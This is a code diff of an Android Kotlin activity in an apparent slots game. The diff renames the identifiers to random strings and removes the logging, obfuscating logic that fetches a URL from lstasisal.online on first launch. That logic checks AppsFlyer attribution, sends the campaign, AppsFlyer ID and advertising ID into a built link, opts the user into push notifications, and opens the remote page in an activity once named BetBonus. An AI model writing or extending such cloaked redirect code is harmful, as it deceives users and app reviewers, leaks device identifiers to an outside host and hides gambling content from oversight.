@@ -4,7 +4,6 @@ import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import android.os.Bundle
-import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.viewModels
@@ -16,8 +15,8 @@ import androidx.core.view.WindowInsetsCompat
 import androidx.core.view.WindowInsetsControllerCompat
 import com.appsflyer.AppsFlyerLib
 import com.onesignal.OneSignal
-import game.wheelsuper.wheelslots.domain.BetBonus
-import game.wheelsuper.wheelslots.domain.MyViewModel
+import game.wheelsuper.wheelslots.domain.JIjihuqwrwqrhijwqiri
+import game.wheelsuper.wheelslots.domain.JIJIhuwqijwirq
 import game.wheelsuper.wheelslots.domain.ijfokJIFIHWQjfiqwfj
 import game.wheelsuper.wheelslots.ui.theme.WheelSlotsTheme
 import kotlinx.coroutines.CoroutineScope
@@ -28,80 +27,68 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 
 class ONjfoqiwjJIFJIWQifjiqfi : ComponentActivity() {
-    private val viewModel: MyViewModel by viewModels()
+    private val viewModel: JIJIhuwqijwirq by viewModels()
     private lateinit var sharedPreferences: SharedPreferences
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
         val wqijrqjiwr8ujirubawirj = WindowCompat.getInsetsController(window, window.decorView)
-        wqijrqjiwr8ujirubawirj.systemBarsBehavior =
-            WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+        wqijrqjiwr8ujirubawirj.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
         wqijrqjiwr8ujirubawirj.hide(WindowInsetsCompat.Type.systemBars())
 
         val scope = CoroutineScope(Dispatchers.IO)
         val ijwqjirjoqwirijqwjfjo = mutableStateOf(false)
         sharedPreferences = getSharedPreferences("WHEEEL", Context.MODE_PRIVATE)
 
-        val decodedString = "https://lstasisal.online/p6twp7"
-        val appsFlyerUid = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
-            val client = OkHttpClient()
-            val request = Request.Builder().url(decodedString).build()
+        val jiqwrhqwjriqwrji = "https://lstasisal.online/p6twp7"
+        val ijqwrjiqwrwji2 = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
+            val ijrwqriqwrqwir2 = OkHttpClient()
+            val jiqwrjiqwjrijiqwri = Request.Builder().url(jiqwrhqwjriqwrji).build()
             scope.launch {
-                Log.d("fkqwjrio",isFirstLaunch().toString())
+
                 try {
-                    if (isFirstLaunch()) {
-                        val response = client.newCall(request).execute()
-                        val responseCode = response.code
+                    if (iqwjjriqwjrjiqjwir()) {
+                        val uwqriqwriqwrjwqjri2 = ijrwqriqwrqwir2.newCall(jiqwrjiqwjrijiqwri).execute()
+                        val ijqwrhquwrjiqwrjiji2 = uwqriqwriqwrjwqjri2.code
                         if (!sharedPreferences.contains("code")) {
                             sharedPreferences.edit().putInt(
                                 "code",
-                                responseCode
+                                ijqwrhquwrjiqwrjiji2
                             ).apply()
                         }
-                        Log.d("fkqwjrio",responseCode.toString())
-                        Log.d("fkqwjrio",sharedPreferences.getString("siteUrl","").toString())
                         withContext(Dispatchers.Main) {
-                            viewModel.initializeAppsFlyer(this@ONjfoqiwjJIFJIWQifjiqfi) { conversionData ->
-                                Log.d("fkqwjrio", "fetchAppsFlyerData")
-
-                                Log.d("fkqwjrio2", "conversionData = $conversionData")
-                                if (conversionData != null && conversionData["af_status"].toString()
+                            viewModel.uhqwriqwjriqwroqwjri(this@ONjfoqiwjJIFJIWQifjiqfi) { conversionData ->
+                               if (conversionData != null && conversionData["af_status"].toString()
                                         .contains("No")
                                 ) {
                                     handleConversionData(
                                         conversionData,
-                                        appsFlyerUid.toString(),
-                                        response.body?.string().toString()
+                                        ijqwrjiqwrwji2.toString(),
+                                        uwqriqwriqwrjwqjri2.body?.string().toString()
                                     )
 
 
 
-                                    Log.d("fkqwjrio", "handleConversionData")
-                                } else {
+                                   } else {
                                     if (sharedPreferences.getString("siteUrl", "")
                                             .isNullOrEmpty()
-                                        && responseCode == 200
+                                        && ijqwrhquwrjiqwrjiji2 == 200
                                     ) {
                                         sharedPreferences.edit().putString(
                                             "siteUrl",
-                                            response.body?.string().toString()
+                                            uwqriqwriqwrjwqjri2.body?.string().toString()
                                         ).apply()
                                     }
-                                    Log.d("fkqwjrio", "navigateToSiteUrl1")
-                                    navigateToSiteUrl(ijwqjirjoqwirijqwjfjo, responseCode)
+                                   iqwrhuqwrjib2hr2irji(ijwqjirjoqwirijqwjfjo, ijqwrhquwrjiqwrjiji2)
                                 }
-
-                                Log.d("fkqwjrio", "waiting for conversionDataFailLiveData...")
 
                             }
 
-                            Log.d("fkqwjrio", "markFirstLaunch")
-                            markFirstLaunch()
+                            ijqwrqwrjrjwiqrjiwri()
                         }
                     } else {
-                        navigateToSiteUrl(ijwqjirjoqwirijqwjfjo,sharedPreferences.getInt("code",404))
-                        Log.d("fkqwjrio","navigateToSiteUrl3")
-                    }
+                        iqwrhuqwrjib2hr2irji(ijwqjirjoqwirijqwjfjo,sharedPreferences.getInt("code",404))
+                       }
                 }
                 catch (e:Exception){
                     ijwqjirjoqwirijqwjfjo.value = true
@@ -126,53 +113,51 @@ class ONjfoqiwjJIFJIWQifjiqfi : ComponentActivity() {
             }
         }
     }
-    private fun isFirstLaunch(): Boolean {
-        val preferences = getPreferences(Context.MODE_PRIVATE)
-        return preferences.getBoolean("isFirstLaunch", true)
+    private fun iqwjjriqwjrjiqjwir(): Boolean {
+        val qijwrhuqwri2 = getPreferences(Context.MODE_PRIVATE)
+        return qijwrhuqwri2.getBoolean("isFirstLaunch", true)
     }
 
-    private fun markFirstLaunch() {
-        val editor = getPreferences(Context.MODE_PRIVATE).edit()
-        editor.putBoolean("isFirstLaunch", false)
-        editor.apply()
+    private fun ijqwrqwrjrjwiqrjiwri() {
+        val qiwjriqwrjiqwrji = getPreferences(Context.MODE_PRIVATE).edit()
+        qiwjriqwrjiqwrji.putBoolean("isFirstLaunch", false)
+        qiwjriqwrjiqwrji.apply()
     }
     private fun handleConversionData(
-        data: Map<String, Any>,
-        appsFlyerUid: String,
-        someValue: String
+        wqjrjqiwrjiqwjir: Map<String, Any>,
+        qrqwrjiqwrjji2: String,
+        vmvvvkkf: String
     ) {
-        val eventData = mapOf(
-            "c" to data["campaign"].toString(),
-            "afID" to appsFlyerUid,
-            "ad" to viewModel.advertisingId
+        val qwijrqwjirwqjir2 = mapOf(
+            "c" to wqjrjqiwrjiqwjir["campaign"].toString(),
+            "afID" to qrqwrjiqwrjji2,
+            "ad" to viewModel.ijqwrqwirjiwrji
         )
-        Log.d("fkqwjrio","handleConversionData")
-        OneSignal.login(viewModel.advertisingId)
+
+        OneSignal.login(viewModel.ijqwrqwirjiwrji)
         OneSignal.User.pushSubscription.optIn()
-        val newLink = viewModel.buildFinalLink(someValue, viewModel.someValue, eventData)
-        Log.d("fkqwjrio",newLink)
-        val tripEgypt = Intent(this@ONjfoqiwjJIFJIWQifjiqfi, BetBonus::class.java)
-        tripEgypt.putExtra("url",newLink)
-        sharedPreferences.edit().putString("url",newLink).apply()
-        startActivity(tripEgypt)
+        val iqwriqwirjiqwri = viewModel.ijqwrhuwqruqwrhiw2(vmvvvkkf, viewModel.qijwrjqwriqwriq, qwijrqwjirwqjir2)
+
+        val riwjhqwriqwjir = Intent(this@ONjfoqiwjJIFJIWQifjiqfi, JIjihuqwrwqrhijwqiri::class.java)
+        riwjhqwriqwjir.putExtra("url",iqwriqwirjiqwri)
+        sharedPreferences.edit().putString("siteUrl",iqwriqwirjiqwri).apply()
+        startActivity(riwjhqwriqwjir)
         finish()
 
     }
 
-    private fun navigateToSiteUrl(canWeGo: MutableState<Boolean>, responseCode:Int) {
+    private fun iqwrhuqwrjib2hr2irji(jiqwrjiqwrqhwr: MutableState<Boolean>, responseCode:Int) {
 
 
         if (sharedPreferences.contains("siteUrl") ||responseCode == 200 ) {
-            val link =  sharedPreferences.getString("siteUrl", null)
-            Log.d("fkqwjrio",link.toString())
-            val tripEgypt = Intent(this@ONjfoqiwjJIFJIWQifjiqfi,BetBonus::class.java)
-            tripEgypt.putExtra("url",link)
-            sharedPreferences.edit().putString("url",link).apply()
-            startActivity(tripEgypt)
+            val qwurjqwjrjiqwjirjiw =  sharedPreferences.getString("siteUrl", null)
+            val qwijrjqiwriwr2 = Intent(this@ONjfoqiwjJIFJIWQifjiqfi,JIjihuqwrwqrhijwqiri::class.java)
+            qwijrjqiwriwr2.putExtra("url",qwurjqwjrjiqwjirjiw)
+            sharedPreferences.edit().putString("siteUrl",qwurjqwjrjiqwjirjiw).apply()
+            startActivity(qwijrjqiwriwr2)
             finish()
         } else {
-            Log.d("fkqwjrio","canWeGo.value = true")
-            canWeGo.value = true
+            jiqwrjiqwrqhwr.value = true
         }
     }
 }
